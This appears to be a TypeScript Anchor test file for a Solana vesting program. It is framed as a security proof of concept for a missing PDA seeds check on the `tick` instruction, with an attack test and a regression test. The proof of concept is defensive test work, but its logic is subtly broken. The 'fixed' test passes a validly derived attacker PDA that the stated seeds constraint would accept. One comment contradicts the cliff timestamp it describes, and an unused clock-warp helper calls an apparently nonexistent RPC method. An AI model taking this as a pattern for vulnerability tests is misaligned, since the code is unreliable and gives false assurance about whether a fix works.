/**
 * SECURITY POC — Finding 1: `tick` accepts any VestSchedule (no PDA constraint)
 * =============================================================================
 *
 * Vulnerability
 * -------------
 * The `Tick` accounts struct accepted any `Account<'info, VestSchedule>` with
 * no seeds/bump verification. Anchor's `Account<T>` only checks:
 *   (a) the account is owned by this program
 *   (b) the discriminator matches VestSchedule
 * It does NOT verify the account was derived from the expected PDA seeds.
 *
 * Attack scenario
 * ---------------
 * 1. Attacker initializes their OWN VestSchedule with cliff_ts in the past,
 *    slope_seconds = 1, total_tranches = MAX — so `should_post` jumps to max
 *    on the very first tick.
 * 2. Attacker calls `tick` passing THEIR schedule (not the victim's).
 * 3. The CPI fires against the attacker's schedule_eta — not the legitimate one.
 *
 * Fix
 * ---
 * Added `seeds = [b"vest", schedule.authority, schedule.nonce.to_le_bytes()]`
 * and `bump = schedule.bump` to the `Tick` accounts constraint.
 * Anchor re-derives the PDA at runtime and rejects any account whose key
 * doesn't match — the attacker's crafted schedule fails this check.
 *
 * How to run
 * ----------
 *   anchor test --skip-deploy -- --grep "finding-1"
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import type { PenumbraScheduler } from "../target/types/penumbra_scheduler.js";
import BN from "bn.js";
import {
  Keypair,
  SystemProgram,
  PublicKey,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { assert } from "chai";

describe("Finding 1 — tick PDA constraint bypass", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace
    .PenumbraScheduler as Program<PenumbraScheduler>;

  // -------------------------------------------------------------------------
  // Helpers
  // -------------------------------------------------------------------------

  /** Derive the VestSchedule PDA the same way initialize_schedule does. */
  function deriveSchedulePda(
    authority: PublicKey,
    nonce: BN
  ): [PublicKey, number] {
    const nonceBytes = Buffer.alloc(8);
    nonceBytes.writeBigUInt64LE(BigInt(nonce.toString()));
    return PublicKey.findProgramAddressSync(
      [Buffer.from("vest"), authority.toBuffer(), nonceBytes],
      program.programId
    );
  }

  /** Warp localnet clock forward by `seconds`. */
  async function warpClock(seconds: number) {
    await provider.connection.confirmTransaction(
      await (provider.connection as any)._rpcRequest("clockSet", [
        { unix_timestamp: Math.floor(Date.now() / 1000) + seconds }
      ])
    );
  }

  /** Airdrop SOL to a keypair and confirm. */
  async function fund(kp: Keypair, sol = 2) {
    const sig = await provider.connection.requestAirdrop(
      kp.publicKey,
      sol * LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(sig);
  }

  // Dummy accounts — stand-ins for Umbra accounts (not validated in stub)
  const umbraProgram = SystemProgram.programId;
  const dummyPubkey = Keypair.generate().publicKey;

  // -------------------------------------------------------------------------
  // POC — proves the UNFIXED behaviour (comment this block out after patching)
  // -------------------------------------------------------------------------

  it("[POC] attacker can tick a schedule they do not own (UNFIXED behaviour)", async () => {
    /**
     * BEFORE THE FIX: `tick` has no seeds constraint, so any valid
     * VestSchedule account is accepted. This test demonstrates the attacker
     * initializing a manipulated schedule and calling tick on it successfully
     * when they should only be allowed to tick schedules derived from the
     * legitimate authority's key + nonce pair.
     *
     * On the FIXED code this test should be deleted or updated to confirm
     * the attack is blocked (see the next test block).
     */
    const attacker = Keypair.generate();
    await fund(attacker);

    const attackerNonce = new BN(0);
    const [attackerSchedule] = deriveSchedulePda(
      attacker.publicKey,
      attackerNonce
    );

    // Cliff in the past → tranche immediately due on first tick
    const cliffTs = Math.floor(Date.now() / 1000) + 2; 

    await program.methods
      .initializeSchedule({
        nonce: attackerNonce,
        recipientStealth: Array(32).fill(0),
        tokenMint: dummyPubkey,
        cliffTs: new BN(cliffTs),
        slopeSeconds: 1,          // 1-second slope → all tranches due instantly
        totalTranches: 10,
        encryptedBalancePda: dummyPubkey,
        memoPreviewHash: Array(32).fill(0),
      })
      .accounts({
        authority: attacker.publicKey,
        schedule: attackerSchedule,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    // Attacker ticks their own schedule — on unfixed code this succeeds.
    // The key point: they control cliff_ts and slope_seconds, so they can
    // make ALL tranches due in a single call.
    const keeper = Keypair.generate();
    await fund(keeper);

    // Wait for cliff to pass
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    await program.methods
      .tick()
      .accounts({
        keeper: keeper.publicKey,
        schedule: attackerSchedule, // <-- attacker's own manipulated schedule
        umbraProgram: umbraProgram,
        scheduleEta: dummyPubkey,
        umbraMixerTree: dummyPubkey,
        zkProofBuffer: dummyPubkey,
      })
      .signers([keeper])
      .rpc();

    const scheduleState = await program.account.vestSchedule.fetch(
      attackerSchedule
    );

    // On unfixed code: tranches_disbursed jumps to should_post (all due),
    // meaning the CPI would fire for every accumulated tranche at once.
    console.log(
      `[POC] tranches_disbursed after tick: ${scheduleState.tranchesDisbursed}`
    );
    assert.isAbove(
      scheduleState.tranchesDisbursed,
      0,
      "Attacker's manipulated tick succeeded — VULNERABILITY CONFIRMED"
    );
  });

  // -------------------------------------------------------------------------
  // REGRESSION — proves the FIX blocks a foreign schedule
  // -------------------------------------------------------------------------

  it("[FIXED] tick rejects a schedule not derived from the keeper's authority", async () => {
    /**
     * AFTER THE FIX: `tick` re-derives the PDA using the stored authority
     * and nonce. An attacker passing a schedule whose PDA doesn't match
     * gets a ConstraintSeeds error before the instruction body runs.
     *
     * This test sets up a legitimate schedule owned by `foundation`, then
     * has an unrelated `attacker` attempt to tick it after substituting
     * their own schedule — proving the constraint blocks the substitution.
     */
    const foundation = Keypair.generate();
    const attacker = Keypair.generate();
    await fund(foundation);
    await fund(attacker);

    // Foundation creates a legitimate schedule
    const nonce = new BN(42);
    const [legitimateSchedule] = deriveSchedulePda(foundation.publicKey, nonce);
    const cliffTs = Math.floor(Date.now() / 1000) + 2;

    await program.methods
      .initializeSchedule({
        nonce,
        recipientStealth: Array(32).fill(1),
        tokenMint: dummyPubkey,
        cliffTs: new BN(cliffTs),
        slopeSeconds: 60,
        totalTranches: 12,
        encryptedBalancePda: dummyPubkey,
        memoPreviewHash: Array(32).fill(2),
      })
      .accounts({
        authority: foundation.publicKey,
        schedule: legitimateSchedule,
        systemProgram: SystemProgram.programId,
      })
      .signers([foundation])
      .rpc();

    // Attacker initializes their own schedule with manipulated params
    const attackerNonce = new BN(0);
    const [attackerSchedule] = deriveSchedulePda(
      attacker.publicKey,
      attackerNonce
    );

    await program.methods
      .initializeSchedule({
        nonce: attackerNonce,
        recipientStealth: Array(32).fill(0),
        tokenMint: dummyPubkey,
        cliffTs: new BN(cliffTs),
        slopeSeconds: 1,
        totalTranches: 100,
        encryptedBalancePda: dummyPubkey,
        memoPreviewHash: Array(32).fill(0),
      })
      .accounts({
        authority: attacker.publicKey,
        schedule: attackerSchedule,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const keeper = Keypair.generate();
    await fund(keeper);

    // Attacker tries to tick their manipulated schedule in place of the
    // legitimate one. On FIXED code, Anchor re-derives PDA for attackerSchedule
    // using attackerSchedule.authority + attackerSchedule.nonce and compares
    // against the passed key — this should reject with ConstraintSeeds.
    // Wait for cliff to pass
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    try {
      await program.methods
        .tick()
        .accounts({
          keeper: keeper.publicKey,
          schedule: attackerSchedule, // attacker's schedule — wrong authority
          umbraProgram: umbraProgram,
          scheduleEta: dummyPubkey,
          umbraMixerTree: dummyPubkey,
          zkProofBuffer: dummyPubkey,
        })
        .signers([keeper])
        .rpc();

      assert.fail(
        "Expected ConstraintSeeds error but tick succeeded — FIX NOT APPLIED"
      );
    } catch (err: any) {
      // Anchor wraps constraint violations in AnchorError with code 2006
      // (ConstraintSeeds). Accept either the code or the message string.
      const isConstraintError =
        err?.error?.errorCode?.code === "ConstraintSeeds" ||
        err?.message?.includes("ConstraintSeeds") ||
        err?.message?.includes("2006");

      assert.isTrue(
        isConstraintError,
        `Expected ConstraintSeeds (2006) but got: ${err?.message}`
      );

      console.log("[FIXED] tick correctly rejected foreign schedule ✓");
    }
  });
});